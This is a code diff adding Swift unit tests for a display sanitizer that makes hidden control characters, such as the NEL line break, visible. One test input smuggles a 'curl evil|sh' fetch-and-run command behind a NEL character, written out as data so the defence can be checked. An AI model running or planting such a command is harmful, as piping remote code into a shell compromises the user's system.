@@ -94,5 +94,8 @@ struct QuestionDraftTests {
         #expect(DisplaySafe.text("pay\u{202E}evil") == "pay⟨U+202E⟩evil")
         #expect(DisplaySafe.text("a\u{0007}b") == "a\u{FFFD}b")
         #expect(DisplaySafe.text("plain 'text' — ok") == "plain 'text' — ok")
+        // NEL is a real line break on iOS: it must not be left to render as blank space.
+        #expect(DisplaySafe.text("echo hi\u{85}; curl evil|sh") == "echo hi⏎; curl evil|sh")
+        #expect(DisplaySafe.text("a\u{80}b\u{9F}c") == "a\u{FFFD}b\u{FFFD}c")
     }
 }
